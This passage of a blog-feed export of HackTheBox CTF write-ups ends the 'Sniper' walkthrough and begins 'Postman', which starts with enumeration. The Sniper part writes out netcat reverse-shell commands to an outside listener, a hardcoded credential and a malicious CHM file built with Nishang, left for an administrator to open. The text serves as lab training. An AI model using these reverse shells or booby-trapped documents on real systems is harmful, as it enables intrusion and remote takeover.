C:\Users\Chris\Desktop&gt; dir</span><br><span class="line">dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Chris\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----        <span class="number">4</span>/<span class="number">11</span>/<span class="number">2019</span>   <span class="number">8</span>:<span class="number">15</span> AM             <span class="number">32</span> user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Chris\Desktop&gt; more user.txt</span><br><span class="line">more user.txt</span><br><span class="line"><span class="number">21f</span>4[----------------------]cf56e</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Chris\Desktop&gt;</span><br></pre></td></tr></table></figure><hr><h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method #2"></a>Method #2</h3><p>Yes there’s a method #2 to get <code>user.txt</code> and this is less hassle than doing port forwarding with powershell but first I will give permission my payas0 folder then setup netcat listener in my Kali <code>nc -lnvp 4444</code> so:</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">PS C:\inetpub\wwwroot\user&gt; icacls <span class="string">"C:\payas0"</span> /grant iusr:F  </span><br><span class="line">icacls <span class="string">"C:\payas0"</span> /grant iusr:F</span><br><span class="line">processed file: C:\payas0</span><br><span class="line">Successfully processed <span class="number">1</span> files; Failed processing <span class="number">0</span> files</span><br></pre></td></tr></table></figure><p>then do script.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">$user = <span class="string">"SNIPER\\Chris"</span></span><br><span class="line"></span><br><span class="line">$password = <span class="string">"36mEAhz/B8xQ~2VM"</span></span><br><span class="line"></span><br><span class="line">$securePassword = ConvertTo-SecureString $password -AsPlainText -Force</span><br><span class="line"></span><br><span class="line">$credential = New-Object</span><br><span class="line"></span><br><span class="line">$credential = New-Object System.Management.Automation.PSCredential $user, $securePassword</span><br><span class="line"></span><br><span class="line">Invoke-Command -ComputerName SNIPER -Credential $credential -ScriptBlock &#123; C:\payas0\nc.exe -e cmd.exe <span class="number">10.10</span><span class="number">.14</span><span class="number">.216</span> <span class="number">4444</span>&#125;</span><br></pre></td></tr></table></figure><p>After executing the last command I have now again the shell (2nd shell) and this was look better.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Sniper via 🐘 v7<span class="number">.3</span><span class="number">.15</span> </span><br><span class="line">❯ nc -lnvp <span class="number">4444</span></span><br><span class="line">listening <span class="keyword">on</span> [any] <span class="number">4444</span> ...</span><br><span class="line">connect to [<span class="number">10.10</span><span class="number">.14</span><span class="number">.216</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">10.10</span><span class="number">.10</span><span class="number">.151</span>] <span class="number">49835</span></span><br><span class="line">Microsoft Windows [Version <span class="number">10.0</span><span class="number">.17763</span><span class="number">.678</span>]</span><br><span class="line">(c) <span class="number">2018</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\Chris\Documents&gt;whoami &amp; hostname</span><br><span class="line">whoami &amp; hostname</span><br><span class="line">sniper\chris</span><br><span class="line">Sniper</span><br><span class="line"></span><br><span class="line">C:\Users\Chris\Documents&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Enumeration begins again’ but this was pretty easy as the the stuffs I needed is all in the basic folder directories.<br>Going at <code>C:\Docs</code> directory there’s a note.txt leave by our “Boss” says.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">C:\Users\Chris\Desktop&gt;cd \Docs                                                                                                                 </span><br><span class="line">cd \Docs                                                                                                                                                    </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">C:\Docs&gt;dir                                                                                                                                                               </span><br><span class="line">dir                                                                                                                                                                       </span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.                                                                                                                                          </span><br><span class="line"> Volume Serial Number <span class="keyword">is</span> <span class="number">6</span>A2B<span class="number">-2640</span></span><br><span class="line"></span><br><span class="line"> Directory of C:\Docs</span><br><span class="line"></span><br><span class="line"><span class="number">03</span>/<span class="number">28</span>/<span class="number">2020</span>  <span class="number">12</span>:<span class="number">46</span> AM    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">03</span>/<span class="number">28</span>/<span class="number">2020</span>  <span class="number">12</span>:<span class="number">46</span> AM    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">04</span>/<span class="number">11</span>/<span class="number">2019</span>  <span class="number">09</span>:<span class="number">31</span> AM               <span class="number">285</span> note.txt</span><br><span class="line"><span class="number">04</span>/<span class="number">11</span>/<span class="number">2019</span>  <span class="number">09</span>:<span class="number">17</span> AM           <span class="number">552</span>,<span class="number">607</span> php <span class="keyword">for</span> dummies-trial.pdf</span><br><span class="line">               <span class="number">2</span> File(s)        <span class="number">552</span>,<span class="number">892</span> bytes</span><br><span class="line">               <span class="number">2</span> Dir(s)  <span class="number">17</span>,<span class="number">953</span>,<span class="number">026</span>,<span class="number">048</span> bytes free</span><br></pre></td></tr></table></figure><h3 id="Note-txt"><a href="#Note-txt" class="headerlink" title="Note.txt"></a>Note.txt</h3><p>What’s on the <code>note.txt</code> ? Well this:</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">C:\Docs&gt;more note.txt</span><br><span class="line">more note.txt</span><br><span class="line">Hi Chris,</span><br><span class="line">        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website <span class="keyword">as</span> there are a lot of bugs <span class="keyword">on</span> it. And I hope that you<span class="string">'ve prepared the documentation for our new app. Drop it here when you'</span>re done with it.</span><br><span class="line"></span><br><span class="line">Regards,</span><br><span class="line">Sniper CEO.</span><br><span class="line"></span><br><span class="line">C:\Docs&gt;</span><br></pre></td></tr></table></figure><p>So hints is on the note ⇒ <code>&quot;The documentaion for the new app, then I will drop it here when I&#39;m done with it.&quot;</code> So there’s a file here here which the Administrator will checked and open it.</p><h3 id="CHM-File"><a href="#CHM-File" class="headerlink" title="CHM File"></a>CHM File</h3><p>Next, in the <code>C:\Users\Chris\Downloads</code> directory there’s a <code>CHM</code> file.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">C:\Docs&gt;cd \Users\Chris\Downloads</span><br><span class="line">cd \Users\Chris\Downloads</span><br><span class="line"></span><br><span class="line">C:\Users\Chris\Downloads\dir</span><br><span class="line">dir</span><br><span class="line">  Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line">  Volume Serial Number <span class="keyword">is</span> <span class="number">6</span>A2B<span class="number">-2640</span></span><br><span class="line"></span><br><span class="line">  Directory of C:\Users\Chris\Downloads</span><br><span class="line"></span><br><span class="line"><span class="number">03</span>/<span class="number">27</span>/<span class="number">2020</span>  <span class="number">11</span>:<span class="number">46</span> PM &lt;DIR&gt;               .</span><br><span class="line"><span class="number">03</span>/<span class="number">27</span>/<span class="number">2020</span>  <span class="number">11</span>:<span class="number">46</span> PM &lt;DIR&gt;               ..</span><br><span class="line"><span class="number">03</span>/<span class="number">27</span>/<span class="number">2020</span>  <span class="number">11</span>:<span class="number">46</span> PM                 <span class="number">281</span> a.html</span><br><span class="line"><span class="number">04</span>/<span class="number">11</span>/<span class="number">2019</span>  <span class="number">08</span>:<span class="number">36</span> AM              <span class="number">10</span>,<span class="number">462</span> instructions.chm</span><br><span class="line">               <span class="number">2</span> File(s)           <span class="number">10</span>,<span class="number">743</span> bytes</span><br><span class="line">               <span class="number">2</span> Dir(s)    <span class="number">17</span>,<span class="number">945</span>,<span class="number">899</span>,<span class="number">008</span> bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Chris\Downloads&gt;</span><br></pre></td></tr></table></figure><h3 id="Generate-Malicious-CHM-File"><a href="#Generate-Malicious-CHM-File" class="headerlink" title="Generate Malicious CHM File"></a>Generate Malicious CHM File</h3><p>To view the chm file, you need to open it with Windows, so I transferred the chm file to my Windows machine, and it is<br>precisely the documentation for the app, requested by the Sniper CEO:</p><p>Administrator will checked <code>CHM</code> and open it then the payload will triggered.</p><p><img src="/img/sniper/instructions1.png" alt="HackTheBox-Sniper/sniper-instructions1.png" title="Sniper Instructions"></p><p>This one is new to me I have never had anything to do with CHM files’ so I did some research about <code>CHM File</code> and I found that you can create a malicious <code>CHM File</code> with <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang</a> and use the <a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1" target="_blank" rel="noopener">Out-CHM.ps1</a>.</p><p>I try to download first the <code>Out-CHM.ps1</code> in my Windows but it rejected because it is considered as a virus’. Well creating a malicious <code>CHM File</code> was fuck me’ as my Windows always deny it even i disable my windows security for a while, Powershell will always reject it.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">PS C:\Users\Medz\Documents\sniper&gt; import-module Out-CHM.ps1</span><br><span class="line">..\Out-CHM.ps1 : The term <span class="string">'Out-CHM.ps1'</span> <span class="keyword">is</span> not recognized <span class="keyword">as</span> the name of a cmdlet, function, script file, or</span><br><span class="line">operable program. Check the spelling of the name, or <span class="keyword">if</span> a path was included, verify that the path <span class="keyword">is</span> correct and <span class="keyword">try</span></span><br><span class="line">again.</span><br><span class="line">At line:<span class="number">1</span> <span class="keyword">char</span>:<span class="number">1</span></span><br><span class="line">+ ..\Out-CHM.ps1</span><br><span class="line">+ ~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : ObjectNotFound: (Out-CHM.ps1:String) [], CommandNotFoundException</span><br><span class="line">    + FullyQualifiedErrorId : CommandNotFoundException</span><br><span class="line"></span><br><span class="line">PS C:\Users\Medz\Documents\sniper&gt;</span><br></pre></td></tr></table></figure><p>but I managed it too using <code>powershell -ep bypass</code></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">PS C:\Users\Medz\Documents\sniper&gt; powershell -ep bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">Try the <span class="keyword">new</span> cross-platform PowerShell https:<span class="comment">//aka.ms/pscore6</span></span><br><span class="line"></span><br><span class="line">PS C:\Users\Medz\Documents\sniper&gt;</span><br></pre></td></tr></table></figure><p>Now before generate a <code>CHM</code> file we need to download this first <a href="https://www.microsoft.com/en-us/download/details.aspx?id=21138" target="_blank" rel="noopener">HTML Help Workshop</a> from Microsoft and choose <code>htmlhelp.exe</code> (run/install it). This will create the folder C:\Program Files (x86)\HTML Help<br>Workshop with the needed programs to create the malicious .chm file.</p><p>and Finally, I can now create <code>CHM</code> file.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">PS C:\Users\Medz\Documents\sniper&gt; import-module .\Out-CHM.ps1</span><br><span class="line">PS C:\Users\Medz\Documents\sniper&gt; Out-CHM -Payload <span class="string">"C:\payas0\nc.exe 10.10.14.216 1234 -e cmd.exe"</span> -HHCPath <span class="string">"C:\Program Files (x86)\HTML Help Workshop"</span></span><br><span class="line">Microsoft HTML Help Compiler <span class="number">4.74</span><span class="number">.8702</span></span><br><span class="line"></span><br><span class="line">Compiling c:\Users\Medz\Documents\sniper\doc.chm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Compile time: <span class="number">0</span> minutes, <span class="number">0</span> seconds</span><br><span class="line"><span class="number">2</span>       Topics</span><br><span class="line"><span class="number">4</span>       Local links</span><br><span class="line"><span class="number">4</span>       Internet links</span><br><span class="line"><span class="number">0</span>       Graphics</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Created c:\Users\Medz\Documents\sniper\doc.chm, <span class="number">13</span>,<span class="number">448</span> bytes</span><br><span class="line">Compression increased file <span class="keyword">by</span> <span class="number">280</span> bytes.</span><br><span class="line">PS C:\Users\Medz\Documents\sniper&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Medz\Documents\sniper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        <span class="number">6</span>/<span class="number">30</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">58</span> PM                Basic Linux Privilege Escalation_files</span><br><span class="line">-a----        <span class="number">6</span>/<span class="number">30</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">58</span> PM          <span class="number">56717</span> Basic Linux Privilege Escalation.html</span><br><span class="line">-a----        <span class="number">3</span>/<span class="number">29</span>/<span class="number">2020</span>   <span class="number">3</span>:<span class="number">20</span> AM          <span class="number">13448</span> doc.chm</span><br><span class="line">-a----        <span class="number">3</span>/<span class="number">29</span>/<span class="number">2020</span>   <span class="number">3</span>:<span class="number">05</span> AM          <span class="number">19502</span> Out-CHM.ps1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\Medz\Documents\sniper&gt;</span><br></pre></td></tr></table></figure><h2 id="Gain-the-Administrator-Shell"><a href="#Gain-the-Administrator-Shell" class="headerlink" title="Gain the Administrator Shell"></a>Gain the Administrator Shell</h2><p>So it’s done ! Now I will upload <code>doc.chm</code> in <code>C:\Docs</code> directory of SNIPER machine.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># powershell</span></span><br><span class="line"></span><br><span class="line">C:\Docs&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number <span class="keyword">is</span> <span class="number">6</span>A2B<span class="number">-2640</span></span><br><span class="line"></span><br><span class="line"> Directory of C:\Docs</span><br><span class="line"></span><br><span class="line"><span class="number">03</span>/<span class="number">28</span>/<span class="number">2020</span>  <span class="number">07</span>:<span class="number">19</span> PM    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">03</span>/<span class="number">28</span>/<span class="number">2020</span>  <span class="number">07</span>:<span class="number">19</span> PM    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">04</span>/<span class="number">11</span>/<span class="number">2019</span>  <span class="number">09</span>:<span class="number">31</span> AM               <span class="number">285</span> note.txt</span><br><span class="line"><span class="number">04</span>/<span class="number">11</span>/<span class="number">2019</span>  <span class="number">09</span>:<span class="number">17</span> AM           <span class="number">552</span>,<span class="number">607</span> php <span class="keyword">for</span> dummies-trial.pdf</span><br><span class="line">               <span class="number">2</span> File(s)        <span class="number">552</span>,<span class="number">892</span> bytes</span><br><span class="line">               <span class="number">2</span> Dir(s)  <span class="number">17</span>,<span class="number">987</span>,<span class="number">465</span>,<span class="number">216</span> bytes free</span><br><span class="line"></span><br><span class="line">C:\Docs&gt;copy \\<span class="number">10.10</span><span class="number">.15</span><span class="number">.33</span>\medz\doc.chm .</span><br><span class="line">copy \\<span class="number">10.10</span><span class="number">.15</span><span class="number">.33</span>\medz\doc.chm .</span><br><span class="line">        <span class="number">1</span> file(s) copied.</span><br><span class="line"></span><br><span class="line">C:\Docs&gt;</span><br></pre></td></tr></table></figure><p>Once we put the <code>doc.chm</code> file in <code>Docs</code> I simply setup <code>netcat</code> listener with my port i generated in malicious chm file. Now all i need to do is to wait the Administrator to checked and open it.</p><h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>After 2-3 minutes I have the administrator shell ! Very nice box !</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Sniper via 🐘 v7<span class="number">.3</span><span class="number">.15</span> </span><br><span class="line">❯ nc -lnvp <span class="number">1234</span></span><br><span class="line">listening <span class="keyword">on</span> [any] <span class="number">1234</span> ...</span><br><span class="line">connect to [<span class="number">10.10</span><span class="number">.15</span><span class="number">.33</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">10.10</span><span class="number">.10</span><span class="number">.151</span>] <span class="number">49703</span></span><br><span class="line">Microsoft Windows [Version <span class="number">10.0</span><span class="number">.17763</span><span class="number">.678</span>]</span><br><span class="line">(c) <span class="number">2018</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami &amp; hostname</span><br><span class="line">whoami &amp; hostname</span><br><span class="line">sniper\administrator</span><br><span class="line">Sniper</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure><h3 id="Get-the-root-txt"><a href="#Get-the-root-txt" class="headerlink" title="Get the root.txt"></a>Get the root.txt</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;cd \Users\Administrator</span><br><span class="line">cd \Users\Administrator</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number <span class="keyword">is</span> <span class="number">6</span>A2B<span class="number">-2640</span></span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator</span><br><span class="line"></span><br><span class="line"><span class="number">04</span>/<span class="number">09</span>/<span class="number">2019</span>  <span class="number">06</span>:<span class="number">47</span> AM    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">04</span>/<span class="number">09</span>/<span class="number">2019</span>  <span class="number">06</span>:<span class="number">47</span> AM    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          <span class="number">3</span>D Objects</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Contacts</span><br><span class="line"><span class="number">10</span>/<span class="number">01</span>/<span class="number">2019</span>  <span class="number">08</span>:<span class="number">44</span> AM    &lt;DIR&gt;          Desktop</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Documents</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Downloads</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Favorites</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Links</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Music</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Pictures</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Saved Games</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Searches</span><br><span class="line"><span class="number">08</span>/<span class="number">14</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">38</span> PM    &lt;DIR&gt;          Videos</span><br><span class="line">               <span class="number">0</span> File(s)              <span class="number">0</span> bytes</span><br><span class="line">              <span class="number">14</span> Dir(s)  <span class="number">17</span>,<span class="number">986</span>,<span class="number">367</span>,<span class="number">488</span> bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;cd Desktop </span><br><span class="line">cd Desktop</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number <span class="keyword">is</span> <span class="number">6</span>A2B<span class="number">-2640</span></span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line"><span class="number">10</span>/<span class="number">01</span>/<span class="number">2019</span>  <span class="number">08</span>:<span class="number">44</span> AM    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">10</span>/<span class="number">01</span>/<span class="number">2019</span>  <span class="number">08</span>:<span class="number">44</span> AM    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">04</span>/<span class="number">11</span>/<span class="number">2019</span>  <span class="number">08</span>:<span class="number">13</span> AM                <span class="number">32</span> root.txt</span><br><span class="line">               <span class="number">1</span> File(s)             <span class="number">32</span> bytes</span><br><span class="line">               <span class="number">2</span> Dir(s)  <span class="number">17</span>,<span class="number">986</span>,<span class="number">367</span>,<span class="number">488</span> bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;more root.txt</span><br><span class="line">more root.txt</span><br><span class="line"><span class="number">5624</span>c[-------------------]<span class="number">436</span>c15</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure><hr><p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p><p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p><hr><p>Referrences:</p><p><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank" rel="noopener">LFI to RFI</a><br><a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell" target="_blank" rel="noopener">WebShell for Windows</a><br><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" target="_blank" rel="noopener">Access Privilege Checked</a><br><a href="https://www.microsoft.com/en-us/download/details.aspx?id=21138" target="_blank" rel="noopener">HTML Workshop</a><br><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1" target="_blank" rel="noopener">Nishang - Out-CHM</a></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
          <category> PenTesting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> retired </tag>
            
            <tag> php </tag>
            
            <tag> lfi </tag>
            
            <tag> rfi </tag>
            
            <tag> chm </tag>
            
            <tag> unintended </tag>
            
            <tag> powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Postman</title>
      <link href="/2020-03-13/HackTheBox-Postman/"/>
      <url>/2020-03-13/HackTheBox-Postman/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/postman/postman1.png" alt="HackTheBox-Postman/postman.png" title="Postman details"></p><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   → This easy machine is very fit to all beginners to learn the basic of Penetration Testing. The machine have a vulnerable software – <code>Redis</code>.<br>   Redis is unprotected without a password set up, and so forth. The simplest thing you can do in such a case, is to write random file such as SSH keys which i’ll use to get in into the machine. After getting the shell, there’s SSH key for user Matt. The machine is very straightforward to the root after you get the credentials of the user and use it for another vulnerability – <code>CVE Webmin 1.910</code>.</p><hr><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>→ Nmap scan</p><p>→ discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>→ Browsing the HTTP Service on different ports</p><p>→ Bruteforce the Web page directories</p><p>→ Check the software vulnerabilities</p></li><li><p><strong>Post - Exploitation</strong></p><p>→ Check if we can inject or put some file inside in the Redis</p><p>→ The goal is to transfer SSH keys</p><p>→ Get in into redis shell</p></li><li><p><strong>Exploitation</strong></p><p>→ Find some interesting things using <code>LinEnum.sh</code> that can use for Exploitation</p><p>→ Get the backup SSH key of a user</p><p>→ Use the credentials for <code>CVE Webmin 1.910</code></p><p>→ Get the root shell</p></li></ol><hr><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>→ First, I run the <strong>Nmap</strong> to scan the target and get information about the various services that are running on the target machine. I use</p><hr><ul><li>-sV      ⇒ Probe open ports to determine service/version info</li><li>-sC      ⇒ equivalent to —script=default</li><li>-T 0-5   ⇒ Set timing template - higher is faster (less accurate)</li><li>-p-      ⇒ Scan all 65535 ports</li><li>-oN      ⇒ to save our scan results to a text file</li></ul><hr><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"><span class="string">nmap</span> <span class="string">-sV</span> <span class="string">-sC</span> <span class="string">-T4</span> <span class="string">-p-</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.154</span> <span class="string">-oN</span> <span class="string">nmap-postman</span></span><br></pre></td></tr></table></figure><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>So there’s port open.</p><ul><li>22           ⇒ running on OpenSSH 7.6p1</li><li>80        ⇒ running on Apache/2.24.49</li><li>6379      ⇒ running on Redis key-value version 4.0.9</li><li>10000     ⇒ running on MiniServ 1.910 (Webmin httpd)</li></ul><p><img src="/img/postman/nmap-postman.png" alt="HackTheBox-Postman/nmap-postman.png" title="Nmap Postman"></p><hr><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>I visited the web page in port 80 and there’s nothing interesting stuffs here except the <code>Postman@htb</code> so added it into my <code>/etc/hosts/</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">10.10.10.160postman.htb</span><br></pre></td></tr></table></figure><p><img src="/img/postman/postman-webpage.gif" alt="HackTheBox-Postman/postman-webpage.gif" title="Webpage of Postman"></p><h3 id="Scan-the-Web-directories"><a href="#Scan-the-Web-directories" class="headerlink" title="Scan the Web directories"></a>Scan the Web directories</h3><p>So, since I don’t have any clue what is on the Web page, I use <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a> <code>Web path scanner</code> to find some stuffs with the following command.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/postman </span><br><span class="line">❯ python3 /opt/dirsearch/dirsearch.py -u <span class="string">"http://10.10.10.160"</span> -e asd -x 403,404 --simple-report=postman-directories</span><br></pre></td></tr></table></figure><p><img src="/img/postman/postman-dirsearch.png" alt="HackTheBox-Postman/postman-dirsearch.png" title="Dirsearch"></p><p>So I have this following directories, everything is a normal web directories except on the <code>/upload/</code> directory which caught my attention.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">[07:32:03] 301 -  310B  - /css  -&gt;  http://10.10.10.160/css/                                                      </span><br><span class="line">[07:32:18] 301 -  312B  - /fonts  -&gt;  http://10.10.10.160/fonts/                                      </span><br><span class="line">[07:32:24] 301 -  313B  - /images  -&gt;  http://10.10.10.160/images/     </span><br><span class="line">[07:32:26] 200 -    4KB - /index.html                                                                          </span><br><span class="line">[07:32:29] 301 -  309B  - /js  -&gt;  http://10.10.10.160/js/                                              </span><br><span class="line">[07:33:26] 301 -  313B  - /upload  -&gt;  http://10.10.10.160/upload/</span><br><span class="line"></span><br><span class="line">[07:33:26] 200 -    8KB - /upload/</span><br></pre></td></tr></table></figure><p>Going to the <code>/upload/</code> directory we will see a lot of image there. I tried to look fo the interesting image’ but I realize that this one is a rabbit hole so moved on and go the next phase.</p><h3 id="Upload-page"><a href="#Upload-page" class="headerlink" title="Upload page"></a>Upload page</h3><p><img src="/img/postman/postman-upload.png" alt="HackTheBox-Postman/postman-upload.png" title="Upload directory"></p><h3 id="Webmin-1-910"><a href="#Webmin-1-910" class="headerlink" title="Webmin 1.910"></a>Webmin 1.910</h3><p>Next is to visit the <code>Port 10000</code> which holding an <code>HTTP</code> service – <code>Miniserv 1.910 (Webmin httpd)</code></p><p><img src="/img/postman/postman-webmin.png" alt="HackTheBox-Postman/postman-webmin.png" title="Webmin 1.910"></p><p>I search the <code>webmin</code> version that runs on the machine to look if there’s an existing exploit and there is.</p><p><a href="https://www.rapid7.com/db/modules/exploit/linux/http/webmin_packageup_rce" target="_blank" rel="noopener">Webmin Package Updates Remote Code Execution</a>.</p><p>   →  Description: This module exploits an arbitrary command execution vulnerability in Webmin 1.910 and lower versions. Any user authorized to the “Package Updates” module can execute arbitrary commands with root privileges.</p><p>Since I don’t have any credentials that will use on that exploits, i will leave this for a while and moved on to the next phase of hunting.</p><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h2><p>Next is to try Redis that appear on my nmap scan.<br>→ Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message 